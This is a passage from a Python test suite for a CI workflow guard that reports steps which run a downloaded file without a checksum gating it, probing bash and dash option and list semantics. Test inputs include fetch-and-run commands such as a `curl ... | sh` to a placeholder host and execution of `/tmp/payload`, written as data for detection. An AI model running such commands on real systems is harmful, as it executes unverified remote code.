        for body in ("set +e\nset -oo pipefail errexit\n%s\n",
                     "set +e\nset -oe xtrace y\n%s\n",
                     "set +e\nset -eo pipefail\n%s\n",
                     "set +e\nset -o pipefail -o errexit\n%s\n"):
            with self.subTest(body=body):
                self.assertEqual([], self.job(body))
        # A template reads its command line the same way, and both options
        # arrive: `bash -oo pipefail errexit -c 'echo RAN $-'` -> `RAN ehBc`,
        # rc 0 on bash 3.2.57 and 5.2.21 (dash: `Illegal option -o
        # pipefail`, rc 2, nothing runs).
        self.assertEqual([], self.job("%s\n", "bash -oo pipefail errexit {0}"))
        self.assertEqual([], self.job(self.PIPED, "bash -oo pipefail errexit {0}"))
        # ... and so does a child shell's (#2444's path).
        self.assertEqual([], self.job("bash -oo pipefail errexit -c '%s; echo ok'\n"))
        # `+oo` turns both OFF per letter: `set -o errexit; set +oo errexit
        # pipefail; echo $-` -> `hBc` with SURVIVED on both bashes. The
        # must-trip controls: a bare `set +e` is still reported, and so is
        # the child shell one value short -- `bash -oo pipefail -c P` is
        # `-c: invalid option name`, rc 2 on both bashes, and runs nothing
        # at all, which this guard reports as the fail-closed answer it has.
        for body in ("set +oo errexit pipefail\n%s\n", "set +e\n%s\n"):
            with self.subTest(body=body):
                found = self.job(body)
                self.assertEqual(1, len(found), found)
                self.assertIn("runs after a `set +e`", found[0][1])
        self.assertIn("carries on past its failure",
                      self.job("bash -oo pipefail -c '%s; echo ok'\n")[0][1])

    def test_a_value_that_is_no_option_name_turns_nothing_on(self):
        # #2560, the fail-open this closes:
        # bash 3.2.57: `set +e; set -o foo -e; echo $-` -> `set: foo: invalid
        #   option name` and `hBc`, rc 0 with SURVIVED printed -- errexit is
        #   still off, so the download runs with the checksum failing.
        # bash 5.2.21: the same, rc 0 with SURVIVED.
        # dash: `set: Illegal option -o foo`, rc 2, the shell dies.
        # `set -ooo pipefail errexit x` is `set: x: invalid option name` (rc 1
        # on 3.2.57, rc 2 on 5.2.21) with nothing after it run, and so is
        # `set -oo x -Ze` -- rc 0 there, errexit still off and SURVIVED
        # printed, which is review NIT 6 of #2551 caught by the NAME now
        # instead of by the value count. The last two rows are where this
        # reading is fail-closed rather than bash to the letter (see above).
        for body in ("set +e\nset -o foo -e\n%s\n",
                     "set +e\nset -ooo pipefail errexit x\n%s\n",
                     "set +e\nset -oo x -Ze\n%s\n",
                     "set +e\nset -o pipefail -o foo\n%s\n",
                     "set +e\nset -e -o foo\n%s\n",
                     "set +e\nset -o errexit -o foo\n%s\n"):
            with self.subTest(body=body):
                found = self.job(body)
                self.assertEqual(1, len(found), found)
                self.assertIn("runs after a `set +e`", found[0][1])
        # A `set -o foo` on its own changes nothing, in either direction, and
        # a bare `set -o` prints the settings and changes nothing either (rc
        # 0 on both bashes).
        for body in ("set -o foo\n%s\n", "set -o\n%s\n"):
            with self.subTest(body=body):
                self.assertEqual([], self.job(body))
        for body in ("set +e\nset -o foo\n%s\n", "set +e\nset -o\n%s\n"):
            with self.subTest(body=body):
                self.assertIn("runs after a `set +e`", self.job(body)[0][1])
        # The controls: the names bash takes still turn their options on,
        # under the step's own shell and under `shell: bash`.
        for body in ("set +e\nset -o errexit\n%s\n", "set +e\nset -oo errexit pipefail\n%s\n",
                     "set +e\nset -e\n%s\n"):
            with self.subTest(body=body):
                self.assertEqual([], self.job(body))
        self.assertEqual([], self.job("set -o pipefail\n" + self.PIPED, "bash -e {0}"))
        self.assertIn("reads `pipefail` as off",
                      self.job("set -o foo\n" + self.PIPED, "bash -e {0}")[0][1])

    def test_a_value_the_guard_cannot_read_is_a_refused_name(self):
        # Review NIT 1 of this branch, kept fail-closed on purpose: with
        # `X=foo`, `set +e; set -o $X -e; false; echo RAN` prints `set: foo:
        # invalid option name` and then RAN on bash 3.2.57 and 5.2.21 --
        # errexit is still off, so the download runs with the checksum
        # failing -- where `X=pipefail` arms it and RAN never prints. The
        # guard cannot know which, so a `$X`, a `"$X"`, a `${X:-pipefail}`
        # or a lifted `$(cmd)` in the name slot reads as a refused name and
        # the step is reported. `_refused_name` reads the same value ON on a
        # COMMAND LINE, where ON means the program runs and is reported too.
        for body in ("set +e\nset -o $X -e\n%s\n",
                     'set +e\nset -o "$X" -e\n%s\n',
                     "set +e\nset -o ${X:-pipefail} -e\n%s\n",
                     "set +e\nset -o $(echo pipefail) -e\n%s\n"):
            with self.subTest(body=body):
                found = self.job(body)
                self.assertEqual(1, len(found), found)
                self.assertIn("runs after a `set +e`", found[0][1])

    def test_every_name_the_builtin_takes_is_read_as_one(self):
        # The table-coverage loop. `set -o` prints the same 27 names on bash
        # 3.2.57 and on 5.2.21: allexport braceexpand emacs errexit errtrace
        # functrace hashall histexpand history ignoreeof interactive-comments
        # keyword monitor noclobber noexec noglob nolog notify nounset onecmd
        # physical pipefail posix privileged verbose vi xtrace. Each one is
        # read as a name the `set` takes, so the `-e` behind it still arms
        # the check; a name outside the table refuses the `set` whole.
        for name in workflow_programs.SET_OPTION_NAMES:
            with self.subTest(name=name):
                self.assertEqual([], self.job("set +e\nset -o %s -e\n" % name + "%s\n"))
        # dash's `set -o` prints 17 names, and three of them are not bash's:
        # `interactive`, `stdin` and `debug`. The builtin here is bash's, so
        # it refuses all three, and the `-e` behind them arms nothing:
        # `set +e; set -o stdin -e; echo $-; false; echo SURVIVED` is `set:
        # stdin: invalid option name`, `hBc`, SURVIVED, rc 0 on bash 3.2.57
        # and on 5.2.21, so the download runs with the checksum failing. On a
        # COMMAND LINE dash takes all three (`dash -o stdin -c 'echo RAN $-'`
        # -> `RAN s`, rc 0), which is why the union reads them on there.
        for name in ("interactive", "stdin", "debug", "foo", "Errexit"):
            with self.subTest(name=name):
                found = self.job("set +e\nset -o %s -e\n" % name + "%s\n")
                self.assertEqual(1, len(found), found)
                self.assertIn("runs after a `set +e`", found[0][1])


class TestTheThreeShellNameListsAgree(unittest.TestCase):
    """#2561: three lists of shell names have to agree. `shell_reader._SHELLS`
    and `workflow_programs._SHELL_STRING` are the shells whose `-c` script
    this guard reads; `_MEASURED_SHELLS` is the subset whose option LETTERS
    and `set -o` NAMES were measured, and the only one of the three for which
    an unknown letter or name reads as "the shell exits and nothing runs"
    (#2475, #2560). A name added to `_SHELL_STRING` without a measurement
    gets the fail-closed reading, which is right; a name added to
    `_MEASURED_SHELLS` without one would be a fail-OPEN, and nothing pinned
    the relationship.

    `ash`/busybox is not measured: this box has none to measure with, so it
    stays out of `_MEASURED_SHELLS` and its option words are read ON."""

    def test_every_measured_shell_is_one_whose_script_the_guard_reads(self):
        self.assertLessEqual(set(workflow_programs._MEASURED_SHELLS),
                             set(workflow_programs._SHELL_STRING))

    def test_the_two_readers_name_the_same_shells(self):
        self.assertEqual(workflow_programs._SHELL_STRING, shell_reader._SHELLS)

    def test_the_measured_shells_are_the_three_that_were_measured(self):
        # A name added here needs the letters of `SHELL_OPTIONS` and the
        # names of `SHELL_OPTION_NAMES` measured on that shell FIRST: what
        # this box has is bash 3.2.57, bash 5.2.21 built from source, and
        # dash. There is no `ash`/busybox here to measure.
        self.assertEqual(("sh", "bash", "dash"), workflow_programs._MEASURED_SHELLS)


class TestTheShoptAndBuiltinSpellingsOfSetAreRead(unittest.TestCase):
    """#2335 and #2338 review N-2: bash moves errexit and pipefail through
    `shopt -u -o NAME` (`-uo`), `shopt -s -o NAME` (`-so`) and `builtin set`,
    and the guard read only `set` and `eval set`. After `shopt -uo errexit` or
    `builtin set +e` bash 5.2.21 runs the use past a failing check the guard
    credited; after `shopt -so pipefail` a piped check gates where the guard
    refused it. A `shopt` with `-s` or `-u` and `-o` now reads as the `set -o`
    or `set +o` it spells, and a leading `builtin` as a leading `command`
    does, under the rule `set` has: off wherever it is written, on only as a
    plain statement -- a plain `shopt` only where the step's shell is bash,
    since dash has none (`shopt: not found`, exit 127), and never behind
    `builtin`, which this guard reads, with `command` and `eval`, as able only
    to turn an option off (bash turns it on through them)."""

    FETCH = TestASetPlusEAtTheStepsTopLevel.FETCH
    CHECK = TestASetPlusEAtTheStepsTopLevel.CHECK
    USE = TestASetPlusEAtTheStepsTopLevel.USE
    PIPED = TestAPipedCheckGatesOnlyUnderPipefail.PIPED
    job = TestASetPlusEAtTheStepsTopLevel.job

    def test_every_spelling_turns_errexit_off_wherever_it_is(self):
        for shell in (None, "sh", "bash"):
            for spelling in ("shopt -uo errexit", "shopt -u -o errexit", "shopt -ou errexit",
                             "shopt -uo nounset errexit", "builtin set +e",
                             "builtin set +o errexit", "command builtin set +e",
                             "builtin command set +e", "eval shopt -uo errexit",
                             "if true; then shopt -uo errexit; fi"):
                with self.subTest(shell=shell, spelling=spelling):
                    found = self.job(spelling + "\n%s\n", shell)
                    self.assertEqual(1, len(found), found)
                    self.assertIn("the checksum that names /tmp/payload runs after a `set +e`",
                                  found[0][1])

    def test_every_spelling_turns_pipefail_off(self):
        for spelling in ("shopt -uo pipefail", "shopt -u -o pipefail", "builtin set +o pipefail",
                         "{ shopt -uo pipefail; }"):
            with self.subTest(spelling=spelling):
                found = self.job(spelling + "\n" + self.PIPED, "bash")
                self.assertEqual(1, len(found), found)
                self.assertIn("is piped into another command where this guard reads `pipefail` "
                              "as off", found[0][1])

    def test_a_plain_shopt_turns_them_on_where_the_shell_is_bash(self):
        for shell in (None, "bash", "bash {0}"):
            for spelling in ("shopt -so errexit", "shopt -s -o errexit"):
                with self.subTest(shell=shell, spelling=spelling):
                    self.assertEqual([], self.job("set +e\n" + spelling + "\n%s\n", shell))
        for shell in (None, "bash -e {0}"):
            for spelling in ("shopt -so pipefail", "shopt -s -o pipefail", "shopt -os pipefail"):
                with self.subTest(shell=shell, spelling=spelling):
                    self.assertEqual([], self.job(spelling + "\n" + self.PIPED, shell))
        # dash has no `shopt`: under `shell: sh` it turns nothing on.
        self.assertIn("runs after a `set +e`",
                      self.job("set +e\nshopt -so errexit\n%s\n", "sh")[0][1])
        self.assertIn("where this guard reads `pipefail` as off",
                      self.job("shopt -so pipefail\n" + self.PIPED, "sh")[0][1])

    def test_a_shopt_that_eval_runs_is_read_under_the_steps_shell(self):
        # Review N-6: `eval` runs its text in the step's own shell, so under
        # dash its `shopt` is not found either and the use runs; the text was
        # read as bash's.
        found = self.job("eval 'set +e; shopt -so errexit'\n%s\n", "sh")
        self.assertEqual(1, len(found), found)
        self.assertIn("runs after a `set +e`", found[0][1])
        # The controls: the same words outside `eval`, and `eval` without the
        # `shopt`, reported; `set -e` inside it, and the `shopt` where the
        # shell is bash, cleared.
        for body in ("set +e\nshopt -so errexit\n%s\n", "eval 'set +e'\n%s\n"):
            with self.subTest(body=body):
                self.assertIn("runs after a `set +e`", self.job(body, "sh")[0][1])
        for shell in (None, "sh", "bash"):
            with self.subTest(shell=shell):
                self.assertEqual([], self.job("eval 'set +e; set -e'\n%s\n", shell))
        for shell in (None, "bash"):
            with self.subTest(shell=shell):
                self.assertEqual([], self.job("eval 'set +e; shopt -so errexit'\n%s\n", shell))

    def test_the_readings_that_stay_fail_closed(self):
        # Bash turns the option on in the first five, which the guard does not
        # read on: behind `builtin`, `command` or `eval`, or inside a branch.
        # The last two turn nothing on: `shopt -o` alone only reports, and
        # `pipefail` is not one of `shopt`'s own options. Each sentence says it
        # is this guard's reading (review N-7).
        off = "where this guard reads `pipefail` as off"
        for body, why in (("set +e\nbuiltin set -e\n%s\n", "runs after a `set +e`"),
                          ("set +e\ncommand shopt -so errexit\n%s\n", "runs after a `set +e`"),
                          ("set +e\neval shopt -so errexit\n%s\n", "runs after a `set +e`"),
                          ("builtin set -o pipefail\n" + self.PIPED, off),
                          ("if true; then shopt -so pipefail; fi\n" + self.PIPED, off),
                          ("shopt -o pipefail\n" + self.PIPED, off),
                          ("shopt -s pipefail\n" + self.PIPED, off)):
            with self.subTest(body=body):
                found = self.job(body)
                self.assertEqual(1, len(found), found)
                self.assertIn(why, found[0][1])
        self.assertEqual([], self.job("shopt -s extglob\n%s\n"))


class TestACheckAheadOfAndGatesOnlyItsList(unittest.TestCase):
    """#2334: bash suspends `-e` for every command of an `&&`/`||` list but
    the last, so a failing check ahead of `&&` only skips the rest of its
    list and the step carries on: bash 3.2 and 5.2 run a later use with the
    check failing, and skip one written inside the list. The guard credited
    such a check as gating the whole job, and its carrier twins too (`sh -c
    'CHECK' && ...`, `eval 'CHECK' && ...`). It now clears only what the list
    runs -- up to the first `||` or the end of the list, a compound command
    in it taken whole -- unless the list's failure is still the step's: as
    its last command, through an `||` branch that exits, or through the
    group it ends -- a subshell's failure, which `-e` does not let pass, or a
    `{ ...; }` group's as the step's last command or through its own `||`."""

    FETCH = TestASetPlusEAtTheStepsTopLevel.FETCH
    CHECK = TestASetPlusEAtTheStepsTopLevel.CHECK
    USE = TestASetPlusEAtTheStepsTopLevel.USE
    job = TestASetPlusEAtTheStepsTopLevel.job

    def both(self, body, shell=None, use=USE):
        """`job_defects`' reasons, which `fetch_exec_defects` gives too where
        the step has no `shell:`."""
        found = [why for _step, why in self.job(body, shell, use)]
        if shell is None:
            self.assertEqual(found, wg.fetch_exec_defects(self.FETCH + body % self.CHECK + use))
        return found

    def test_a_use_after_the_list_is_reported(self):
        for shell in (None, "bash"):
            for body in ("%s && echo verified\n", "%s && echo ok || echo failed\n",
                         "true && %s && echo ok\n", "%s && echo ok &\n", "{ %s && echo ok; }\n",
                         "if true; then %s && echo ok; fi\n", "set +e\n%s && echo ok\n",
                         "sh -c '%s' && echo ok\n", "eval '%s' && echo ok\n",
                         "{ %s && echo ok; } && echo more\n", "{ %s && echo ok; } || true\n",
                         "( %s && echo ok ) || true\n", "( %s && echo ok ) &\nwait\n"):
                with self.subTest(shell=shell, body=body):
                    found = self.both(body, shell)
                    self.assertEqual(1, len(found), found)
                    self.assertIn("the checksum that names /tmp/payload runs ahead of `&&`, "
                                  "where the shell suspends `-e`", found[0])
        # A subshell piped into `tee` hands its failure to the pipeline, which
        # takes `tee`'s status unless pipefail holds.
        self.assertEqual(1, len(self.both("( %s && echo ok ) | tee log\n")))
        self.assertEqual([], self.job("( %s && echo ok ) | tee log\n", "bash"))

    def test_a_use_the_list_runs_after_an_or_is_reported(self):
        # The list's `||` branch runs BECAUSE the check failed: a use there
        # is the failing path, not a verified one.
        found = self.both("%s && echo ok || sh /tmp/payload\n", use="")
        self.assertEqual(1, len(found), found)
        self.assertIn("runs ahead of `&&`", found[0])

    def test_a_use_inside_the_list_is_cleared(self):
        for body in ("%s && chmod +x /tmp/payload && /tmp/payload\necho done\n",
                     "%s && { chmod +x /tmp/payload; /tmp/payload; }\necho done\n",
                     "%s && if true; then chmod +x /tmp/payload; fi\necho done\n",
                     "true && %s && chmod +x /tmp/payload\necho done\n",
                     "set +e\n%s && chmod +x /tmp/payload\necho done\n",
                     "sh -c '%s' && chmod +x /tmp/payload && /tmp/payload\necho done\n",
                     "eval '%s' && chmod +x /tmp/payload\necho done\n"):
            with self.subTest(body=body):
                self.assertEqual([], self.both(body, use=""))
        self.assertEqual([], self.job("%s && chmod +x /tmp/payload\necho done\n", "bash {0}", ""))

    def test_where_the_lists_failure_still_stops_the_step(self):
        for body in ("%s && echo ok || exit 1\n", "( %s && echo ok )\n",
                     "(cd /tmp && %s && echo ok)\n", "eval '%s && echo ok'\n",
                     "( %s && echo ok ) || exit 1\n", "{ %s && echo ok; } || exit 1\n",
                     "{\n  %s && echo ok\n} || exit 1\n"):
            with self.subTest(body=body):
                self.assertEqual([], self.both(body))
        # As the step's last command, the list's status is the step's -- and a
        # `{ ...; }` group's, when the list is that group's last command.
        for body in (" && echo verified\n", " && echo verified; }\n"):
            with self.subTest(body=body):
                self.assertEqual([], wg.job_defects([
                    wg.Step("check", self.FETCH + ("{ " if "}" in body else "") + self.CHECK
                            + body), wg.Step("run", self.USE)]))

    def test_the_lists_own_controls_read_as_before(self):
        # A check piped into `tee` has lost its status before `&&` reads it,
        # one with no digest checks nothing, and a step carrying
        # `continue-on-error: true` lets the job carry on past its failure
        # even where the list ends the step.
        piped = self.job("%s | tee log && chmod +x /tmp/payload\necho done\n", use="")
        self.assertEqual(1, len(piped), piped)
        self.assertIn("where this guard reads `pipefail` as off", piped[0][1])
        bare = wg.job_defects([("s", self.FETCH + 'echo "/tmp/payload" | sha256sum -c - && '
                                "chmod +x /tmp/payload\necho done\n")])
        self.assertEqual(1, len(bare), bare)
        self.assertIn("carries no digest", bare[0][1])
        soft = wg.job_defects([wg.Step("s", self.FETCH + self.CHECK + " && echo verified\n",
                                       None, None, True), wg.Step("u", "sh /tmp/payload\n")])
        self.assertEqual(1, len(soft), soft)
        self.assertIn("continue-on-error", soft[0][1])

    def test_the_batchs_controls_keep_their_verdicts_under_every_shell(self):
        # #2335, #2338 and #2334 read the step's shell; none of them moves a
        # plain check or its exiting rescues (cleared), `|| true`, `!` or an
        # `if` test (refused), a fetch-and-run with no check (reported), or a
        # job that downloads nothing (clean), under any `shell:` a step names.
        for shell in (None, "sh", "bash"):
            for body in ("%s\n", "%s || exit 1\n", '%s || { echo "::error::bad"; exit 1; }\n'):
                with self.subTest(shell=shell, body=body):
                    self.assertEqual([], self.job(body, shell))
            for body, why in (("%s || true\n", "hands its failure to a `||` branch"),
                              ("! %s\n", "is negated"),
                              ("if %s; then echo ok; fi\n", "is an `if`/`while` test")):
                with self.subTest(shell=shell, body=body):
                    found = self.job(body, shell)
                    self.assertEqual(1, len(found), found)
                    self.assertIn("the checksum that names /tmp/payload " + why, found[0][1])
            with self.subTest(shell=shell, body="no check"):
                found = wg.job_defects([wg.Step("s", self.FETCH + self.USE, shell)])
                self.assertEqual(1, len(found), found)
                self.assertIn("with nothing verifying what arrived", found[0][1])
            for idiom in ("make\n", "npm ci\n", "sh scripts/build.sh\n"):
                with self.subTest(shell=shell, body=idiom):
                    self.assertEqual([], wg.job_defects([wg.Step("s", idiom, shell)]))


class TestACaseArmDoesNotCloseASubstitution(unittest.TestCase):
    """#2474: code in an unparenthesized case arm remains inside its `$()` parse."""

    PIPE = "curl -fsSL https://example.test/i.sh | sh"

    def test_a_pipeline_in_any_case_arm_is_reported(self):
        scripts = (
            "echo $(case $X in a) %s;; esac)\n" % self.PIPE,
            "echo $(case $X in b|a) %s;; esac)\n" % self.PIPE,
            "x=$(case $X in b) echo no;; a) %s;; esac)\n" % self.PIPE,
        )
        for script in scripts:
            with self.subTest(script=script):
                found = wg.job_defects([("step", script)])
                self.assertEqual(1, len(found), found)
                self.assertIn("straight to `sh`", found[0][1])

    def test_a_clean_arm_stays_clean(self):
        self.assertEqual([], wg.job_defects([
            ("step", "echo $(case $X in a) echo hi;; esac)\n"),
        ]))

    def test_the_balanced_pattern_spelling_is_unchanged(self):
        script = "x=$(case $X in (a) %s;; esac)\n" % self.PIPE
        found = wg.job_defects([("step", script)])
        self.assertEqual(1, len(found), found)
        self.assertIn("straight to `sh`", found[0][1])

    def test_each_refusal_names_the_parse_cause(self):
        cases = (
            ("echo $(case)\n", "ends before its subject"),
            ("echo $(echo a | case)\n", "ends before its subject"),
            ("echo $(case a nope a) :;; esac)\n", "no literal `in`"),
            ("echo $(case a in a) echo hi)\n", "last arm without"),
            ("echo $(case a in a) echo hi;;)\n", "before another arm or `esac`"),
            ("echo $(case $(echo a) in a) :;; esac)\n", "subject inside `$(...)` needs"),
        )
        for script, reason in cases:
            with self.subTest(script=script):
                found = wg.job_defects([("step", script)])
                self.assertEqual(1, len(found), found)
                self.assertIn(reason, found[0][1])


class TestAConditionalCheckGatesOnlyItsReachedPath(unittest.TestCase):
    """#2419: a check behind ``&&`` or ``||`` may never run."""

    FETCH = TestASetPlusEAtTheStepsTopLevel.FETCH
    CHECK = TestASetPlusEAtTheStepsTopLevel.CHECK
    USE = TestASetPlusEAtTheStepsTopLevel.USE

    def defects(self, body, shell=None, use=USE):
        script = self.FETCH + body % self.CHECK + use
        found = [why for _step, why in wg.job_defects([wg.Step("step", script, shell)])]
        if shell is None:
            self.assertEqual(found, wg.fetch_exec_defects(script))
        return found

    def test_a_check_the_left_side_may_skip_does_not_clear_a_later_use(self):
        for shell in (None, "sh", "bash"):
            for body in ("test -f /nonexistent && %s\n", "true && %s\n",
                         "true && { %s; }\n", "true || %s\n"):
                with self.subTest(shell=shell, body=body):
                    found = self.defects(body, shell)
                    self.assertEqual(1, len(found), found)
                    self.assertIn(
                        "is reached only through the `&&`/`||` list before it", found[0]
                    )

    def test_an_or_conditional_check_does_not_clear_a_use_in_another_step(self):
        for shell in (None, "sh", "bash"):
            with self.subTest(shell=shell):
                found = wg.job_defects([
                    wg.Step("check", self.FETCH + "true || " + self.CHECK + "\n", shell),
                    ("use", self.USE),
                ])
                self.assertEqual(1, len(found), found)
                self.assertEqual("check", found[0][0])
                self.assertIn(
                    "is reached only through the `&&`/`||` list before it", found[0][1]
                )

    def test_a_use_on_the_checks_and_suffix_still_shares_its_condition(self):
        for shell in (None, "sh", "bash"):
            with self.subTest(shell=shell):
                self.assertEqual([], self.defects(
                    "test -f /maybe && %s && chmod +x /tmp/payload && /tmp/payload\n",
                    shell,
                    use="",
                ))

    def test_an_and_suffix_after_or_does_not_require_the_check(self):
        for shell in (None, "sh", "bash"):
            with self.subTest(shell=shell):
                found = self.defects(
                    "true || %s && chmod +x /tmp/payload && /tmp/payload\n",
                    shell,
                    use="",
                )
                self.assertEqual(1, len(found), found)
                self.assertIn("is reached only through the `&&`/`||` list", found[0])

    def test_an_inlined_use_shares_its_carriers_condition(self):
        for shell in (None, "sh", "bash"):
            for prefix in ("false ||", "true &&"):
                with self.subTest(shell=shell, prefix=prefix, use="inside"):
                    self.assertEqual([], self.defects(
                        prefix + " sh -ec '%s; " + self.USE + "'\n", shell, use=""
                    ))
            for prefix in ("true ||", "false &&"):
                with self.subTest(shell=shell, prefix=prefix, use="after"):
                    found = self.defects(prefix + " sh -ec '%s'\n", shell)
                    self.assertEqual(1, len(found), found)
                    self.assertIn("is reached only through the `&&`/`||` list", found[0])

    def test_a_grouped_use_shares_its_or_carriers_condition(self):
        for shell in (None, "sh", "bash"):
            for opened, closed in (("{", "; }"), ("(", ")")):
                with self.subTest(shell=shell, opened=opened, use="inside"):
                    self.assertEqual([], self.defects(
                        "false || " + opened + " %s; " + self.USE.strip() + closed + "\n",
                        shell,
                        use="",
                    ))
                with self.subTest(shell=shell, opened=opened, use="after"):
                    found = self.defects("true || " + opened + " %s" + closed + "\n", shell)
                    self.assertEqual(1, len(found), found)
                    self.assertIn("is reached only through the `&&`/`||` list", found[0])

    def test_a_multiline_brace_carrier_keeps_only_its_own_uses(self):
        for shell in (None, "sh", "bash"):
            with self.subTest(shell=shell, use="inside"):
                self.assertEqual([], self.defects(
                    "false || {\necho before\n%s\n" + self.USE + "\n}\n", shell, use=""
                ))
            with self.subTest(shell=shell, use="after"):
                found = self.defects("true || {\necho before\n%s\n}\n", shell)
                self.assertEqual(1, len(found), found)
                self.assertIn("is reached only through the `&&`/`||` list", found[0])

    def test_an_unconditional_check_still_clears_a_later_use(self):
        for shell in (None, "sh", "bash"):
            with self.subTest(shell=shell):
                self.assertEqual([], self.defects("%s\n", shell))

    def test_an_and_conditional_that_ends_the_step_still_gates_the_next_step(self):
        for shell in (None, "sh", "bash"):
            for condition in ("test -f /maybe", "true"):
                with self.subTest(shell=shell, condition=condition):
                    self.assertEqual([], wg.job_defects([
                        wg.Step("check", self.FETCH + condition + " && " + self.CHECK + "\n",
                                shell),
                        ("use", self.USE),
                    ]))

    def test_a_soft_and_conditional_step_does_not_gate_the_next_step(self):
        found = wg.job_defects([
            wg.Step("check", self.FETCH + "false && " + self.CHECK + "\n",
                    None, None, True),
            ("use", self.USE),
        ])
        self.assertEqual(1, len(found), found)
        self.assertIn("continue-on-error", found[0][1])

    def test_an_and_conditional_with_an_exiting_rescue_still_gates(self):
        for shell in (None, "sh", "bash"):
            with self.subTest(shell=shell):
                self.assertEqual([], self.defects(
                    "test -f /maybe && %s || exit 1\n", shell
                ))


class TestLineOnlySubshellBoundariesReachTheGuard(unittest.TestCase):
    """#2420: a subshell closer carries its list, pipe, or detach separator."""

    FETCH = TestASetPlusEAtTheStepsTopLevel.FETCH
    CHECK = TestASetPlusEAtTheStepsTopLevel.CHECK
    USE = TestASetPlusEAtTheStepsTopLevel.USE

    def defects(self, body, shell):
        script = self.FETCH + body.replace("CHECK", self.CHECK) + self.USE
        return wg.job_defects([wg.Step("run", script, shell)])

    def assert_reported(self, body, shell, reason=None):
        found = self.defects(body, shell)
        self.assertEqual(1, len(found), found)
        if reason is not None:
            self.assertIn(reason, found[0][1])

    def test_a_multiline_closer_keeps_each_unsafe_separator(self):
        for shell in (None, "sh", "bash"):
            for body, reason in (
                    ("(\nCHECK\n) || true\n", "ends a group that hands its failure"),
                    ("(\nCHECK\n) && echo verified\n", "runs ahead of `&&`"),
                    ("(\nCHECK\n) &\nwait\n", "ends a group that is detached")):
                with self.subTest(shell=shell, body=body):
                    self.assert_reported(body, shell, reason)

    def test_a_stdin_child_inside_the_subshell_keeps_the_closer(self):
        for shell in (None, "sh", "bash"):
            for runner, suffix in (("bash -s", ") || true\n"),
                                   ("bash -s", ") &\nwait\n"),
                                   ("sh", ") || true\n")):
                body = "( %s <<'EOF'\nCHECK\nEOF\n%s" % (runner, suffix)
                with self.subTest(shell=shell, runner=runner, suffix=suffix):
                    self.assert_reported(body, shell)

    def test_line_only_parens_keep_option_changes_inside_the_subshell(self):
        for shell in (None, "sh", "bash"):
            body = "set +e\n(\n  shopt -so errexit\n)\nCHECK\n"
            with self.subTest(shell=shell, option="errexit"):
                found = self.defects(body, shell)
                self.assertEqual(1, len(found), found)
                self.assertIn("runs after a `set +e`", found[0][1])
        found = self.defects("(\n  shopt -so pipefail\n)\nCHECK | cat\n", None)
        self.assertEqual(1, len(found), found)
        self.assertIn("where this guard reads `pipefail` as off", found[0][1])

        for shell in (None, "sh", "bash"):
            for prefix in ("(\n  set +e\n)\n", "(set +e; true) &\nwait\n"):
                with self.subTest(shell=shell, option="errexit restored", prefix=prefix):
                    self.assertEqual([], self.defects(prefix + "CHECK\n", shell))
        for prefix in ("(\n  set +o pipefail\n)\n",
                       "(set +o pipefail; true) &\nwait\n"):
            with self.subTest(option="pipefail restored", prefix=prefix):
                self.assertEqual([], self.defects(prefix + "CHECK | cat\n", "bash"))

    def test_array_parens_cannot_cancel_a_later_subshell_boundary(self):
        body = "arr=(\n  a\n)\nCHECK && (\n  echo skipped\n)\n"
        for shell in (None, "bash"):
            with self.subTest(shell=shell):
                self.assert_reported(body, shell)

    def test_a_plain_or_stopping_multiline_subshell_remains_a_gate(self):
        for shell in (None, "sh", "bash"):
            for body in ("(\nCHECK\n)\n",
                         "(\nCHECK && echo verified\n)\n",
                         "( CHECK && case x in x) echo yes;; esac )\n",
                         "(\nCHECK\n) || exit 1\n"):
                with self.subTest(shell=shell, body=body):
                    self.assertEqual([], self.defects(body, shell))

    def test_the_one_line_unsafe_controls_stay_reported(self):
        for shell in (None, "sh", "bash"):
            for body in ("( CHECK ) || true\n", "( CHECK ) &\nwait\n"):
                with self.subTest(shell=shell, body=body):
                    self.assert_reported(body, shell)


class TestAConditionalListKeepsItsCompoundCommandBoundaries(unittest.TestCase):
    """#2334, #2420 and #2474: the guard places the end of an `&&` list by
    counting its visible compound commands. Line-only subshell boundaries and
    case arms inside substitutions remain visible, so each list gets its real
    reach instead of the compatibility refusal for an unread boundary."""

    FETCH = TestASetPlusEAtTheStepsTopLevel.FETCH
    CHECK = TestASetPlusEAtTheStepsTopLevel.CHECK
    USE = TestASetPlusEAtTheStepsTopLevel.USE
    job = TestASetPlusEAtTheStepsTopLevel.job
    both = TestACheckAheadOfAndGatesOnlyItsList.both

    AHEAD = "runs ahead of `&&`, where the shell suspends `-e`"
    def assertAhead(self, body, shell, why=AHEAD):
        found = self.both(body, shell)
        self.assertEqual(1, len(found), found)
        self.assertIn("the checksum that names /tmp/payload " + why, found[0])

    def test_a_line_only_paren_keeps_the_ordinary_list_reach(self):
        for shell in (None, "sh", "bash"):
            for body in ("%s && ( echo a\n)\n", "%s && ( echo a\n  echo b\n)\n",
                         "%s && ( cd / && echo a\n)\n", "%s && (\n  echo a )\n"):
                with self.subTest(shell=shell, body=body):
                    self.assertAhead(body, shell)

    def test_a_case_inside_a_substitution_leaves_the_list_end_readable(self):
        bodies = (
            "%s && if true; then echo $(case x in x) echo y | cat;; esac); fi\n",
            "{ %s && if true; then echo $(case x in x) echo y;; esac); fi; }\n",
            "{\n%s && if true; then echo $(case x in x) echo y;; esac); fi\n}\n",
        )
        for shell in (None, "sh", "bash"):
            for body in bodies:
                with self.subTest(shell=shell, body=body):
                    self.assertAhead(body, shell)

    def test_the_spellings_the_count_reads_whole_keep_their_verdicts(self):
        # The subshell on one line, both parens on lines of their own, the
        # substitution without the `if` and the `if` without the `case` all
        # keep an ordinary readable list.
        for shell in (None, "sh", "bash"):
            for body in ("%s && ( echo a )\n", "%s && (\n  echo a\n)\n",
                         "%s && echo $(case x in x) echo y | cat;; esac)\n",
                         "%s && if true; then echo $(echo y | cat); fi\n"):
                with self.subTest(shell=shell, body=body):
                    self.assertAhead(body, shell)
        # A subshell the list does end, opened on the check's line or before
        # it, is the subshell's failure, which `-e` does not let pass.
        for body in ("( %s && echo ok )\n", "(cd /tmp && %s && echo ok)\n",
                     "( echo a; %s && echo ok )\n", "( ( %s && echo ok ) )\n"):
            with self.subTest(body=body):
                self.assertEqual([], self.both(body))

    def test_a_multiline_subshell_after_and_keeps_its_boundary(self):
        # Each check heads an `&&` list whose skipped subshell cannot gate the
        # later use, with or without pipefail.
        for shell, body in (("bash", "%s && (\n  echo b\n) 2>&1 | tee log\n"),
                            ("bash", "%s &&\n(\n  echo b\n) 2>&1 | tee log\n"),
